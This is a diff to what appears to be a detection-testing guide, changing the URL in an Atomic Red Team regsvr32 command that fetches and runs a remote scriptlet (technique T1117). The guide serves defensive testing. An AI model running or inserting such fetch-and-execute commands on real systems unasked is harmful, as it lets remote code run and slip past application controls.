@@ -44,7 +44,7 @@ The details of this test, [which are located here](https://github.com/redcanaryc
 describe how you can test your detection by simply running the below command:
 
 ```
-regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll
+regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll
 ```
 
 ## Collect Evidence
